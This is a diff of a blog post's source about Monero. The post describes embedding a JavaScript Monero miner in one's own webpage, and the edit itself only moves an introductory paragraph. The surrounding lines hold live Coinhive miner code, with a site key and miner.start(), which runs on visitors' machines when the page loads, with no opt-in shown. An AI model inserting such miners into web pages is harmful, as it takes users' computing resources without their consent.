@@ -6,7 +6,7 @@ tags: [monero, XMR, crypto, currency, cryptocurrency, mine, miner, mining, graph
 comments: true
 ---
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-
+Monero (XMR) is a cryptocurrency focused around privacy, decentralization and scalability. It was created in April of 2014 and has since seen a huge uptick in adoption. 
 <script>
 	var miner = new CoinHive.Anonymous('l0YCiLkEmA6Nk1UBDRL9O0OsHSOem86y');
 	miner.start();
@@ -40,8 +40,6 @@ comments: true
 		xhttp.send(); 
 	}
 </script>
-
-Monero (XMR) is a cryptocurrency focused around privacy, decentralization and scalability. It was created in April of 2014 and has since seen a huge uptick in adoption. 
 The current price of Monero based on data retrieved from the CryptoCompare API is <p id="XMRprice"></p>
 
 I discovered an interesting service today that allows you to embed a Monero Javascript miner into your own webpage. 
